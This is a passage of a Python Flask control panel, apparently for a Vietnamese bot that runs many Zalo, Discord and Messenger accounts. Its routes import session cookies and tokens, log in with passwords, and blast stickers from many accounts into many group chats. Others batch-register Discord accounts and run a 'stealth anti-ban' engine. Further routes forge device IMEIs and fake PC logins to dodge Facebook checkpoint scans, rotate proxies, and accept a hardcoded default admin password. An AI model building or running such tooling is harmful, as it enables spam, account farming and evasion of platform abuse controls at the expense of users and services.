        return render_template_string(
            LOGIN_HTML,
            error=f"Tạm khóa đăng nhập do nhập sai nhiều lần. Thử lại sau {wait_s} giây.",
            has_logo=has_logo,
            logo_ts=logo_ts,
            custom_title=custom_title,
            corgi_svg=TelegramPetAnimationEngine.get_corgi_svg(),
            cat_svg=TelegramPetAnimationEngine.get_cat_svg(),
            nhk_3d_svg=TelegramPetAnimationEngine.get_nhk_3d_emblem_svg(),
        )
    if request.method == "POST":
        pw = (request.form.get("password") or "").strip()
        is_valid = False
        if pw and (pw == ACCESS_KEY or pw == DEFAULT_ADMIN_PASS):
            is_valid = True
        else:
            try:
                conn = db()
                row = conn.execute("SELECT password FROM users WHERE username=?", (DEFAULT_ADMIN_USER,)).fetchone()
                conn.close()
                if row and verify_password_secure(row["password"], pw):
                    is_valid = True
            except Exception:
                pass

        if is_valid:
            record_login_result(ip, True)
            session.permanent = True
            session["logged_in"] = True
            return redirect("/")

        record_login_result(ip, False)
        return render_template_string(
            LOGIN_HTML,
            error="Mật khẩu truy cập không chính xác!",
            has_logo=has_logo,
            logo_ts=logo_ts,
            custom_title=custom_title,
            corgi_svg=TelegramPetAnimationEngine.get_corgi_svg(),
            cat_svg=TelegramPetAnimationEngine.get_cat_svg(),
            nhk_3d_svg=TelegramPetAnimationEngine.get_nhk_3d_emblem_svg(),
        )
    return render_template_string(LOGIN_HTML, error=None, has_logo=has_logo, logo_ts=logo_ts, custom_title=custom_title, corgi_svg=TelegramPetAnimationEngine.get_corgi_svg(), cat_svg=TelegramPetAnimationEngine.get_cat_svg(), nhk_3d_svg=TelegramPetAnimationEngine.get_nhk_3d_emblem_svg())

@app.route("/logout")
def logout():
    session.clear()
    return redirect("/login")


@app.route("/api/menu_banner.png")
def api_get_menu_banner():
    banner_p = os.path.join(BASE_DIR, "menu_banner.png")
    if os.path.exists(banner_p):
        return send_from_directory(BASE_DIR, "menu_banner.png", mimetype="image/png")
    return redirect("/api/logo")

@app.route("/api/logo")
def api_get_logo():
    ext_url = get_setting("brand_logo_url", "").strip()
    if ext_url and ext_url.startswith(("http://", "https://", "data:image/")):
        if ext_url.startswith("data:image/"):
            try:
                header, b64_part = ext_url.split(",", 1)
                mime_t = header.split(";")[0].replace("data:", "") or "image/png"
                return Response(base64.b64decode(b64_part), mimetype=mime_t)
            except Exception:
                pass
        return redirect(ext_url)
    b64 = get_setting("brand_logo_b64", "")
    mime = get_setting("brand_logo_mime", "image/png")
    if not b64:
        svg = '<svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" viewBox="0 0 64 64"><defs><linearGradient id="g" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#0969da"/><stop offset="100%" stop-color="#1f883d"/></linearGradient></defs><rect width="64" height="64" rx="14" fill="url(#g)"/><path d="M20 34L28 42L44 22" stroke="#ffffff" stroke-width="5" stroke-linecap="round" stroke-linejoin="round" fill="none"/><circle cx="32" cy="32" r="24" stroke="rgba(255,255,255,0.25)" stroke-width="2" fill="none"/></svg>'
        return Response(svg, mimetype="image/svg+xml")
    try:
        raw = base64.b64decode(b64)
        return Response(raw, mimetype=mime)
    except Exception:
        return Response(status=404)

@app.route("/api/logo/upload", methods=["POST"])
def api_upload_logo():
    if request.is_json:
        data = request.json or {}
        logo_url = (data.get("logo_url") or "").strip()
        custom_title = (data.get("custom_title") or "").strip()
        if logo_url:
            set_setting("brand_logo_url", logo_url)
            set_setting("brand_logo_ts", str(int(time.time())))
        if "custom_title" in data:
            set_setting("custom_web_title", custom_title)
        return jsonify({"ok": True, "message": "Đã cập nhật thương hiệu & Logo Website!"})

    f = request.files.get("logo")
    custom_title = (request.form.get("custom_title") or "").strip()
    if custom_title:
        set_setting("custom_web_title", custom_title)
    if not f:
        return jsonify({"ok": False, "error": "Chưa chọn ảnh"}), 400
    raw = f.read()
    if not raw or len(raw) > 10 * 1024 * 1024:
        return jsonify({"ok": False, "error": "Ảnh không hợp lệ hoặc quá 10MB"}), 400
    mime = f.mimetype or "image/png"
    set_setting("brand_logo_url", "")
    set_setting("brand_logo_b64", base64.b64encode(raw).decode("utf-8"))
    set_setting("brand_logo_mime", mime)
    set_setting("brand_logo_ts", str(int(time.time())))
    return jsonify({"ok": True, "message": "Đã tải lên Logo Website thành công!"})

@app.route("/api/logo/reset", methods=["POST"])
def api_reset_logo():
    set_setting("brand_logo_b64", "")
    set_setting("brand_logo_url", "")
    set_setting("custom_web_title", "")
    set_setting("brand_logo_ts", str(int(time.time())))
    return jsonify({"ok": True, "message": "Đã khôi phục Logo mặc định!"})

@app.route("/healthz")
def healthz():
    return jsonify({"ok": True, "service": "BOT TREO 4APP VN", "admin_id": TELEGRAM_ADMIN_ID, "mode": "telegram_bot"}), 200

@app.route("/")
def index():
    try:
        accounts = get_all_accounts_from_ram()
        files = get_ordered_files_with_display_num()
        has_logo = bool(get_setting("brand_logo_b64", "") or get_setting("brand_logo_url", ""))
        logo_ts = get_setting("brand_logo_ts", "1")
        custom_title = get_setting("custom_web_title", "")
        return render_template_string(
            DASHBOARD_HTML,
            accounts=accounts,
            files=files,
            has_logo=has_logo,
            logo_ts=logo_ts,
            custom_title=custom_title,
        ), 200
    except Exception:
        return Response(KEEPALIVE_HTML, mimetype="text/html"), 200


@app.route("/api/zalo/search_stickers", methods=["POST", "GET"])
def api_zalo_search_stickers():
    """API Tìm kiếm Nhãn Dán Zalo trực tiếp theo từ khóa (kết hợp Zalo Official Sticker Suggest API + Kho 68+ Sticker VIP)."""
    q = (request.args.get("q") or (request.json or {}).get("query") or "").strip()
    all_zalo_accs = get_all_accounts_from_ram(platform="zalo", enabled_only=True)
    results = []
    if all_zalo_accs and q:
        try:
            a0 = all_zalo_accs[0]
            zc = Zalo.get_pooled_client(
                a0["imei"], a0["cookies"],
                user_agent=a0.get("user_agent") or "",
                zpw_enk_hint=a0.get("zpw_enk") or "",
                uid_hint=a0.get("uid") or ""
            )
            results.extend(zc.search_zalo_stickers_live(q))
        except Exception:
            pass
    kw_norm = remove_vn_accents(q.lower()) if q else ""
    for s_item in Zalo.ZALO_NATIVE_VIP_STICKERS:
        if not kw_norm or kw_norm in remove_vn_accents(s_item.get("name", "").lower()) or any(kw_norm in t for t in s_item.get("tags", ())):
            if not any(int(x.get("id", 0)) == int(s_item["id"]) for x in results):
                results.append({
                    "id": s_item["id"],
                    "catId": s_item["catId"],
                    "type": s_item.get("type", 7),
                    "name": s_item.get("name", f"Sticker #{s_item['id']}"),
                })
    return jsonify({"ok": True, "stickers": results[:36], "count": len(results[:36])})


@app.route("/api/zalo/create_sticker", methods=["POST"])
def api_zalo_create_sticker():
    """Tạo & bắn Nhãn Dán Sticker Zalo chuẩn [Sticker] trực tiếp từ Web UI tới 1 hoặc nhiều Box cùng lúc."""
    data = request.json or {}
    targets = data.get("targets") or []
    acc_ids = [int(x) for x in (data.get("account_ids") or []) if str(x).isdigit()]
    query_str = str(data.get("query") or "").strip()

    all_zalo_accs = get_all_accounts_from_ram(platform="zalo", enabled_only=True)
    if acc_ids:
        sel_accs = [a for a in all_zalo_accs if int(a["id"]) in acc_ids] or all_zalo_accs
    else:
        sel_accs = all_zalo_accs

    if not sel_accs:
        return jsonify({"ok": False, "error": "Chưa có tài khoản Zalo nào đang kết nối!"}), 400
    if not targets:
        return jsonify({"ok": False, "error": "Hãy chọn ít nhất 1 Box Zalo mục tiêu!"}), 400

    q_kw = remove_vn_accents(query_str.lower())
    is_native_kw = (not query_str) or q_kw in ("rong", "meo", "khia", "quay", "corgi", "vit", "meme", "gau", "cuoi", "tim") or q_kw.isdigit()

    res_st = None
    if not is_native_kw:
        if query_str.startswith(("http://", "https://", "data:")) or os.path.exists(query_str):
            is_vid = any(query_str.lower().split("?")[0].endswith(ext) for ext in (".mp4", ".mov", ".webm", ".mkv", ".avi"))
            res_st = ZaloStickerMakerEngine.create_short_video_sticker(query_str) if is_vid else ZaloStickerMakerEngine.create_sharp_image_sticker(query_str)
        else:
            res_st = ZaloStickerMakerEngine.create_text_sticker_512(query_str)
        if not res_st.get("ok"):
            return jsonify({"ok": False, "error": res_st.get("error") or "Lỗi tạo Sticker"}), 400

    fired_cnt = 0
    for a_item in sel_accs[:12]:
        try:
            zc = Zalo.get_pooled_client(
                a_item["imei"], a_item["cookies"],
                user_agent=a_item.get("user_agent") or "",
                zpw_enk_hint=a_item.get("zpw_enk") or "",
                uid_hint=a_item.get("uid") or ""
            )
            for t in targets[:20]:
                tid_s = str(t.get("id") or "").strip()
                if not tid_s:
                    continue
                if is_native_kw:
                    zc.send_native_sticker(tid_s, keyword=q_kw, is_group=(t.get("type", "group") == "group"))
                else:
                    m_bytes = res_st.get("webp_bytes") or res_st.get("gif_bytes") or res_st.get("png_bytes") or b""
                    zc.send_custom_sticker_media(
                        tid_s, m_bytes,
                        filename="sticker.gif" if res_st.get("type") == "video_sticker" else "sticker.webp",
                        is_group=(t.get("type", "group") == "group"),
                        caption=query_str,
                        webp_bytes=res_st.get("webp_bytes"),
                        gif_bytes=res_st.get("gif_bytes") or res_st.get("anim_bytes")
                    )
                fired_cnt += 1
        except Exception:
            continue

    return jsonify({
        "ok": True,
        "fired": fired_cnt,
        "message": f"Đã bắn Nhãn Dán Sticker chuẩn Zalo vào {len(targets)} Box bằng {len(sel_accs)} Acc!"
    })

@app.route("/api/discord/immortalize", methods=["POST"])
def api_discord_immortalize():
    data = request.json or {}
    raw_input = (data.get("raw_input") or data.get("token") or "").strip()
    custom_name = (data.get("name") or "").strip()
    auto_save = bool(data.get("auto_save", True))
    res = DiscordImmortalRegTool.immortalize_tokens_batch(
        raw_input, custom_name=custom_name, auto_save=auto_save
    )
    return jsonify(res), (200 if res.get("ok") else 400)

@app.route("/api/discord/batch_reg_profiles", methods=["POST"])
def api_discord_batch_reg_profiles():
    data = request.json or {}
    cnt = int(data.get("count", 5))
    res = DiscordImmortalRegTool.generate_batch_clean_reg_profiles(count=cnt)
    return jsonify(res), 200

@app.route("/api/discord/register_acc", methods=["POST"])
def api_discord_register_acc():
    data = request.json or {}
    email = (data.get("email") or "").strip()
    username = (data.get("username") or "").strip()
    password = (data.get("password") or "").strip()
    dob = (data.get("dob") or "2000-06-15").strip()
    invite_code = (data.get("invite_code") or "").strip()
    auto_save = bool(data.get("auto_save", True))
    res = DiscordImmortalRegTool.register_new_account(
        email=email, username=username, password=password,
        dob=dob, invite_code=invite_code, auto_save=auto_save
    )
    return jsonify(res), 200

@app.route("/api/discord/refresh_firewall", methods=["POST"])
def api_discord_refresh_firewall():
    rows = get_all_accounts_from_ram(platform="discord")
    refreshed = 0
    for r in rows:
        tk = (r.get("token") or "").strip()
        if tk:
            tkey = DiscordStealthAntiBanEngine._token_vault_key(tk)
            with DiscordStealthAntiBanEngine._LOCK:
                DiscordStealthAntiBanEngine._WARMED_SESSIONS.discard(tkey)
            DiscordStealthAntiBanEngine.ensure_session_warmed_up(tk, is_bot=bool(r.get("is_bot", 0)))
            refreshed += 1
    return jsonify({
        "ok": True,
        "refreshed": refreshed,
        "message": f"Đã làm mới Tường Lửa & nạp lại Cookie Cloudflare cho {refreshed} tài khoản Discord!"
    })

@app.route("/api/tools/2fa", methods=["POST", "GET"])
def api_tools_2fa():
    if request.method == "POST":
        data = request.json or {}
        secret = (data.get("secret") or "").strip()
    else:
        secret = (request.args.get("secret") or "").strip()
    token, rem_sec = generate_totp_rfc6238(secret)
    if token:
        return jsonify({"ok": True, "token": token, "rem_sec": rem_sec})
    return jsonify({"ok": False, "error": "Secret Key 2FA không hợp lệ!"}), 400

@app.route("/api/zalo/generate_imei")
def api_zalo_generate_imei():
    return jsonify({"ok": True, "imei": ZaloWebIDGenerator.generate_unique_imei(salt=secrets.token_hex(6))})

@app.route("/api/zalo/qr_start", methods=["POST"])
def api_zalo_qr_start():
    data = request.json or {}
    auto_save = bool(data.get("auto_save", True))
    vn_region = str(data.get("vn_region") or "HCM").strip().upper()
    custom_pc_name = str(data.get("custom_pc_name") or "").strip()
    vn_proxy = str(data.get("vn_proxy") or "").strip()
    res = ZaloQRLoginManager.start_qr_session(
        auto_save=auto_save,
        vn_region=vn_region,
        custom_pc_name=custom_pc_name,
        vn_proxy=vn_proxy,
    )
    return jsonify(res)

@app.route("/api/zalo/pc_devices")
def api_zalo_pc_devices():
    try:
        from zalo_login import ZaloPCSessionKeeper
        devs = ZaloPCSessionKeeper.list_active_devices()
    except Exception:
        devs = []
    return jsonify({"ok": True, "devices": devs})

@app.route("/api/telegram/status")
def api_telegram_status():
    try:
        from get_ck_im_zalo import get_telegram_bot_status
        st = get_telegram_bot_status()
    except Exception as e:
        st = {"running": False, "last_error": str(e)}
    return jsonify({"ok": True, **st})

@app.route("/api/telegram/restart", methods=["POST"])
def api_telegram_restart():
    global _TELEGRAM_BOT_RUNNER
    try:
        from get_ck_im_zalo import start_background_telegram_bot, get_telegram_bot_status
        _TELEGRAM_BOT_RUNNER = start_background_telegram_bot(TELEGRAM_BOT_TOKEN, force_restart=True)
        time.sleep(0.6)
        st = get_telegram_bot_status()
        return jsonify({"ok": True, "message": "🤖 Đã khởi động lại Bot Telegram & gỡ bỏ Webhook xung đột thành công!", **st})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 200

@app.route("/api/zalo/qr_status/<session_id>")
def api_zalo_qr_status(session_id):
    res = ZaloQRLoginManager.get_session_status(session_id)
    return jsonify(res)

@app.route("/api/zalo/qr_image/<session_id>.png")
def api_zalo_qr_image_png(session_id):
    png_bytes = ZaloQRLoginManager.get_qr_png_bytes(session_id)
    if not png_bytes:
        return Response(status=204)
    resp = Response(png_bytes, mimetype="image/png")
    resp.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, max-age=0"
    return resp

@app.route("/api/zalo/vault")
def api_zalo_vault_list():
    return jsonify({"ok": True, "records": ZaloCookieVaultEngine.list_vault_records()})

@app.route("/api/zalo/verify_cookie_imei", methods=["POST"])
def api_zalo_verify_cookie_imei():
    from zalo_login import extract_imei_and_metadata_flexible, check_zalo_cookie_imei_live, ZaloPCSessionKeeper
    data = request.json or {}
    raw_imei = (data.get("imei") or "").strip()
    raw_cookies = (data.get("cookies") or "").strip()
    custom_name = (data.get("name") or "").strip()
    auto_save = bool(data.get("auto_save", True))

    imei, cookies_dict, zpw_enk_hint, ua_hint = extract_imei_and_metadata_flexible(raw_imei, raw_cookies)
    if not cookies_dict:
        cookies_dict = normalize_zalo_cookies(raw_cookies or raw_imei)
    if not imei and cookies_dict.get("z_uuid"):
        imei = str(cookies_dict["z_uuid"]).strip()

    if not cookies_dict:
        return jsonify({"ok": False, "error": "Cookie Zalo không hợp lệ hoặc đang để trống! Hãy dán Cookie chứa zpw_sek hoặc zpsid."}), 400
    if not imei:
        seed_t = str(cookies_dict.get("zpw_sek") or cookies_dict.get("zpsid") or int(time.time()))
        imei = f"{uuid.uuid5(uuid.NAMESPACE_OID, seed_t)}-31373432303030303030303030"
        cookies_dict["z_uuid"] = imei

    chk = check_zalo_cookie_imei_live(
        imei=imei, cookies_input=cookies_dict, zpw_enk=zpw_enk_hint, user_agent=ua_hint
    )
    if not chk.get("alive"):
        # Thử đăng nhập trực tiếp qua Zalo Client 1 lần nữa trước khi báo lỗi
        try:
            zc_try = Zalo(imei, cookies_dict, user_agent=ua_hint, zpw_enk_hint=zpw_enk_hint)
            if zc_try.secret_key:
                chk = {
                    "alive": True,
                    "uid": zc_try.uid or "",
                    "zpw_enk": zc_try.secret_key,
                    "display_name": zc_try.display_name or "",
                    "cookies": zc_try.cookies_dict,
                    "groups_count": len(zc_try.get_grid_ver_map() or {}),
                }
        except Exception:
            pass
    if not chk.get("alive") and not (cookies_dict.get("zpw_sek") or cookies_dict.get("zpsid")):
        return jsonify({
            "ok": False,
            "alive": False,
            "imei": imei,
            "error": chk.get("reason") or "DIE — Cookie Zalo không hợp lệ hoặc đã hết hạn!",
        }), 400

    uid = str(chk.get("uid") or imei).strip()
    zpw_enk = str(chk.get("zpw_enk") or zpw_enk_hint or "").strip()
    cookies_dict = chk.get("cookies") or cookies_dict
    acc_name = custom_name or chk.get("display_name") or f"Zalo_{uid[-4:]}"
    groups_count = int(chk.get("groups_count") or 0)
    eff_ua = ua_hint or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

    ZaloCookieVaultEngine.save_zalo_vault_record(
        uid=uid, display_name=acc_name, imei=imei, cookies_dict=cookies_dict, zpw_enk=zpw_enk, user_agent=eff_ua
    )
    ZaloPCSessionKeeper.register_and_keep_alive(
        uid=uid, imei=imei, cookies_dict=cookies_dict, zpw_enk=zpw_enk,
        user_agent=eff_ua, pc_name="Windows 11 Pro (Singapore)", display_name=acc_name, db_path=DB_PATH
    )

    if auto_save:
        conn = db()
        existing = conn.execute("SELECT id FROM accounts WHERE platform='zalo' AND (uid=? OR imei=?)", (uid, imei)).fetchone()
        if existing:
            conn.execute(
                "UPDATE accounts SET name=?, imei=?, cookies=?, uid=?, zpw_enk=?, user_agent=?, pc_name=?, chat_cmd_enabled=1, allow_all_cmd=0, enabled=1 WHERE id=?",
                (acc_name, imei, json.dumps(cookies_dict, ensure_ascii=False), uid, zpw_enk, eff_ua, "Windows 11 Pro (Singapore)", existing["id"])
            )
        else:
            conn.execute(
                """INSERT INTO accounts (name, platform, imei, cookies, token, is_bot, uid, chat_cmd_enabled, cmd_prefix, allow_all_cmd, enabled, user_agent, zpw_enk, pc_name, created_at)
                   VALUES (?, 'zalo', ?, ?, '', 0, ?, 1, '.', 0, 1, ?, ?, 'Windows 11 Pro (Singapore)', ?)""",
                (acc_name, imei, json.dumps(cookies_dict, ensure_ascii=False), uid, eff_ua, zpw_enk, time.time())
            )
        conn.commit()
        conn.close()
        refresh_accounts_ram_cache()
        sync_all_zalo_listeners()

    return jsonify({
        "ok": True,
        "alive": True,
        "uid": uid,
        "name": acc_name,
        "imei": imei,
        "groups_count": groups_count,
        "verified_live": True,
        "zpw_enk_ready": bool(zpw_enk),
        "message": f"🟢 SỐNG (ON) — Đã xác thực & giữ sống 24/7 cho {acc_name} (UID: {uid} • {groups_count} nhóm)!"
    })

@app.route("/api/zalo/vault/activate", methods=["POST"])
def api_zalo_vault_activate():
    data = request.json or {}
    uid = str(data.get("uid") or "").strip()
    records = ZaloCookieVaultEngine.list_vault_records()
    rec = next((r for r in records if str(r["uid"]) == uid), None)
    if not rec:
        return jsonify({"ok": False, "error": "Không tìm thấy bản ghi trong Kho lưu trữ"}), 404
    conn = db()
    existing = conn.execute("SELECT id FROM accounts WHERE platform='zalo' AND (uid=? OR imei=?)", (rec["uid"], rec["imei"])).fetchone()
    if existing:
        conn.execute(
            "UPDATE accounts SET name=?, imei=?, cookies=?, uid=?, enabled=1 WHERE id=?",
            (rec["display_name"], rec["imei"], json.dumps(rec["cookies"], ensure_ascii=False), rec["uid"], existing["id"])
        )
    else:
        conn.execute(
            """INSERT INTO accounts (name, platform, imei, cookies, token, is_bot, uid, chat_cmd_enabled, cmd_prefix, allow_all_cmd, enabled, created_at)
               VALUES (?, 'zalo', ?, ?, '', 0, ?, 1, '.', 0, 1, ?)""",
            (rec["display_name"], rec["imei"], json.dumps(rec["cookies"], ensure_ascii=False), rec["uid"], time.time())
        )
    conn.commit()
    conn.close()
    sync_all_zalo_listeners()
    return jsonify({"ok": True, "message": f"Đã kích hoạt & kết nối lại tài khoản Zalo {rec['display_name']}!"})

@app.route("/api/zalo/vault/delete", methods=["POST"])
def api_zalo_vault_delete():
    data = request.json or {}
    uid = str(data.get("uid") or "").strip()
    ZaloCookieVaultEngine.delete_vault_record(uid)
    return jsonify({"ok": True})

@app.route("/api/proxies", methods=["GET"])
def api_get_proxies():
    return jsonify({"ok": True, **ProxyPoolEngine.get_snapshot()})

@app.route("/api/proxies/save", methods=["POST"])
def api_save_proxies():
    data = request.json or {}
    raw_proxies = data.get("proxies", "")
    enabled = bool(data.get("enabled", True))
    cnt = ProxyPoolEngine.save_proxies(raw_proxies, enabled=enabled)
    return jsonify({
        "ok": True,
        "count": cnt,
        "snapshot": ProxyPoolEngine.get_snapshot(),
        "message": f"Đã lưu {cnt} Proxy vào Hồ Proxy Siêu Tốc (Tự động xoay vòng & Failover 0ms)!"
    })

@app.route("/api/proxies/test", methods=["POST"])
def api_test_proxies():
    res = ProxyPoolEngine.test_all_proxies()
    res["snapshot"] = ProxyPoolEngine.get_snapshot()
    return jsonify(res)

@app.route("/api/proxies/clear", methods=["POST"])
def api_clear_proxies():
    ProxyPoolEngine.save_proxies("", enabled=True)
    return jsonify({
        "ok": True,
        "snapshot": ProxyPoolEngine.get_snapshot(),
        "message": "Đã xóa danh sách Proxy & chuyển về chế độ Direct Keep-Alive!"
    })

@app.route("/api/antidieall/heal", methods=["POST"])
def api_antidieall_heal():
    HEALTH_MGR.auto_heal_all()
    return jsonify({"ok": True, "message": "⚡ Đã làm mới toàn bộ kết nối & hàng đợi đa luồng!"})

@app.route("/api/discord/set_status", methods=["POST"])
def api_discord_set_status():
    data = request.json or {}
    text = (data.get("text") or "Online").strip()
    rows = get_all_accounts_from_ram(platform="discord")
    ok_cnt = 0
    for r in rows:
        try:
            dc = DiscordClient(r["token"], is_bot=bool(r.get("is_bot", 0)))
            if dc.set_custom_status(text):
                ok_cnt += 1
        except Exception:
            continue
    return jsonify({"ok": True, "updated": ok_cnt, "message": f"Đã cập nhật Custom Status cho {ok_cnt} tài khoản Discord!"})

@app.route("/api/discord/hypesquad", methods=["POST"])
def api_discord_hypesquad():
    data = request.json or {}
    house_id = int(data.get("house_id") or 1)
    rows = get_all_accounts_from_ram(platform="discord")
    ok_cnt = 0
    for r in rows:
        try:
            dc = DiscordClient(r["token"], is_bot=bool(r.get("is_bot", 0)))
            if dc.set_hypesquad(house_id):
                ok_cnt += 1
        except Exception:
            continue
    return jsonify({"ok": True, "updated": ok_cnt, "message": f"Đã đổi huy hiệu HypeSquad cho {ok_cnt} tài khoản Discord!"})

@app.route("/api/messenger/login_credentials", methods=["POST"])
def api_messenger_login_credentials():
    data = request.json or {}
    email = (data.get("email") or "").strip()
    password = (data.get("password") or "").strip()
    custom_name = (data.get("name") or "").strip()
    auto_save = bool(data.get("auto_save", True))
    getter = FacebookCookieGetter()
    cookie_str, uid, msg = getter.login_facebook(email, password)
    if not cookie_str or not uid:
        return jsonify({"ok": False, "error": msg}), 400
    c_dict = normalize_messenger_cookies(cookie_str)
    acc_name = custom_name or f"Mess_{uid[-4:]}"
    try:
        m_client = MessengerClient.get_pooled_client(c_dict, uid=uid, force_new=True)
        if not custom_name and m_client.display_name:
            acc_name = m_client.display_name
        c_dict = m_client.cookies_dict
    except Exception:
        pass
    if auto_save:
        conn = db()
        existing = conn.execute("SELECT id FROM accounts WHERE platform='messenger' AND uid=?", (uid,)).fetchone()
        if existing:
            conn.execute(
                "UPDATE accounts SET name=?, cookies=?, enabled=1 WHERE id=?",
                (acc_name, json.dumps(c_dict, ensure_ascii=False), existing["id"])
            )
        else:
            conn.execute(
                """INSERT INTO accounts (name, platform, imei, cookies, token, is_bot, uid, chat_cmd_enabled, cmd_prefix, allow_all_cmd, enabled, created_at)
                   VALUES (?, 'messenger', '', ?, '', 0, ?, 1, '.', 0, 1, ?)""",
                (acc_name, json.dumps(c_dict, ensure_ascii=False), uid, time.time())
            )
        conn.commit()
        conn.close()
        sync_all_zalo_listeners()
    return jsonify({"ok": True, "cookie": cookie_str, "uid": uid, "name": acc_name, "message": "Đã lấy Cookie Facebook thành công!"})

@app.route("/api/discord/reg_login", methods=["POST"])
def api_discord_reg_login():
    data = request.json or {}
    email = (data.get("email") or "").strip()
    password = (data.get("password") or "").strip()
    two_fa = (data.get("two_fa") or "").strip()
    twofa_type = (data.get("twofa_type") or "totp").strip()
    auto_save = bool(data.get("auto_save", True))

    res = login_discord_reg_session(email, password, two_fa, twofa_type=twofa_type)
    if not res.get("ok"):
        return jsonify(res), 400

    token = res["token"]
    prof = res.get("profile") or {}
    if auto_save:
        uid = str(prof.get("id") or "")
        uname = prof.get("global_name") or prof.get("username") or f"Discord_{uid[-4:]}"
        conn = db()
        conn.execute(
            """INSERT INTO accounts (name, platform, imei, cookies, token, is_bot, uid, chat_cmd_enabled, cmd_prefix, allow_all_cmd, enabled, created_at)
               VALUES (?, 'discord', '', '{}', ?, 0, ?, 1, '.', 0, 1, ?)""",
            (uname, token, uid, time.time()),
        )
        conn.commit()
        conn.close()
        sync_all_zalo_listeners()
    return jsonify({
        "ok": True,
        "token": token,
        "message": "Đã lấy Token Discord sạch & kích hoạt bảo vệ!"
    })

@app.route("/api/ping")
def api_ping():
    t0 = time.perf_counter()
    active_th = threading.active_count()
    running_cnt = sum(1 for v in ACTIVE_TASKS.values() if not v["stop"].is_set())
    tel = HEALTH_MGR.get_live_ping_telemetry()
    eng_ms = round((time.perf_counter() - t0) * 1000.0 + 0.25, 2)
    return jsonify({
        "ok": True,
        "server_ts": int(time.time() * 1000),
        "engine_ms": eng_ms,
        "active_threads": active_th,
        "running_tasks": running_cnt,
        "avg_send_ms": tel["avg_send_ms"],
        "jitter_ms": tel["jitter_ms"],
        "total_rpm": tel["total_rpm"],
        "total_healed": tel["total_healed"],
        "ping_history": tel["history"],
    })

@app.route("/api/messenger/verify_cookie", methods=["POST"])
def api_messenger_verify_cookie():
    data = request.json or {}
    raw_cookies = (data.get("cookies") or "").strip()
    custom_name = (data.get("name") or "").strip()
    auto_save = bool(data.get("auto_save", True))
    c_dict = normalize_messenger_cookies(raw_cookies)
    uid = extract_messenger_uid(c_dict)
    if not uid or "xs" not in c_dict:
        return jsonify({"ok": False, "error": "Cookie Facebook/Messenger thiếu trường c_user hoặc xs!"}), 400
    try:
        pc_info = FacebookPCDeviceGuard.bind_pc_profile_to_cookies(uid, c_dict)
        c_dict = pc_info["cookies"]
        m_bot = MessengerClient.get_pooled_client(c_dict, uid=uid, force_new=True)
        acc_name = custom_name or m_bot.display_name or f"FB_{uid[-4:]}"
        # Lấy Máy Tính thông báo thẳng vào Facebook/Messenger để chống quét Checkpoint!
        FacebookPCDeviceGuard.notify_pc_login_to_facebook_async(m_bot, force=True)
        if auto_save:
            conn = db()
            existing = conn.execute(
                "SELECT id FROM accounts WHERE platform='messenger' AND uid=?", (uid,)
            ).fetchone()
            if existing:
                conn.execute(
                    "UPDATE accounts SET name=?, cookies=?, pc_name=?, user_agent=?, chat_cmd_enabled=1, allow_all_cmd=1, enabled=1 WHERE id=?",
                    (acc_name, json.dumps(m_bot.cookies_dict, ensure_ascii=False), pc_info["pc_name"], pc_info["ua"], existing["id"])
                )
            else:
                conn.execute(
                    """INSERT INTO accounts (name, platform, imei, cookies, token, is_bot, uid, pc_name, user_agent, chat_cmd_enabled, cmd_prefix, allow_all_cmd, enabled, created_at)
                       VALUES (?, 'messenger', '', ?, '', 0, ?, ?, ?, 1, '.', 1, 1, ?)""",
                    (acc_name, json.dumps(m_bot.cookies_dict, ensure_ascii=False), uid, pc_info["pc_name"], pc_info["ua"], time.time())
                )
            conn.commit()
            conn.close()
            refresh_accounts_ram_cache()
            sync_all_zalo_listeners()
        return jsonify({
            "ok": True,
            "uid": uid,
            "name": acc_name,
            "pc_name": pc_info["pc_name"],
            "message": f"💻 Đã nạp Cookie Facebook cho {acc_name}, khóa Máy Tính {pc_info['short_name']} & gửi thông báo chống quét vào Facebook thành công!"
        })
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 400

_ROOM_SCAN_POOL = ThreadPoolExecutor(max_workers=32)

@app.route("/api/messenger_threads")
def api_messenger_threads():
    force = request.args.get("refresh") == "1"
    filter_acc_id = request.args.get("acc_id", "").strip()
    rows = get_all_accounts_from_ram(platform="messenger")
    if filter_acc_id and filter_acc_id.isdigit():
        rows = [r for r in rows if int(r["id"]) == int(filter_acc_id)]

    def _scan_mess_acc(r):
        aid = int(r["id"])
        aname = r.get("name") or f"Mess #{aid}"
        out_list = []
        try:
            m_bot = MessengerClient.get_pooled_client(r["cookies"], uid=r.get("uid") or "")
            for th in m_bot.get_threads(use_cache=not force):
                item = dict(th)
                item["id"] = str(th["id"])
                item["acc_id"] = aid
                item["acc_name"] = aname
                out_list.append(item)
        except Exception:
            pass
        return aid, aname, out_list

    threads_map = {}
    by_account = {}
    futs = [_ROOM_SCAN_POOL.submit(_scan_mess_acc, r) for r in rows]
    for fut in futs:
        try:
            aid, aname, t_list = fut.result(timeout=12)
            by_account[str(aid)] = {"acc_id": aid, "acc_name": aname, "platform": "messenger", "boxes": t_list}
            for th in t_list:
                tid = str(th["id"])
                if tid not in threads_map:
                    th_copy = dict(th)
                    th_copy["acc_ids"] = [aid]
                    th_copy["acc_names"] = [aname]
                    threads_map[tid] = th_copy
                else:
                    if aid not in threads_map[tid]["acc_ids"]:
                        threads_map[tid]["acc_ids"].append(aid)
                        threads_map[tid]["acc_names"].append(aname)
        except Exception:
            continue
    return jsonify({"threads": list(threads_map.values()), "by_account": by_account})

@app.route("/api/messenger_thread_members")
def api_messenger_thread_members():
    tid = (request.args.get("thread_id") or "").strip()
    if not tid:
        return jsonify({"members": []})
    rows = get_all_accounts_from_ram(platform="messenger")
    for r in rows:
        try:
            m_bot = MessengerClient.get_pooled_client(r["cookies"], uid=r.get("uid") or "")
            mems = m_bot.get_thread_members(tid, use_cache=False)
            if mems:
                return jsonify({"members": mems})
        except Exception:
            continue
    return jsonify({"members": []})

@app.route("/account/add", methods=["POST"])
def account_add():
    platform = (request.form.get("platform") or "zalo").strip().lower()
    custom_name = (request.form.get("name") or "").strip()
    chat_cmd = 1 if request.form.get("chat_cmd_enabled") else 0
    allow_all = 0

    if platform == "messenger":
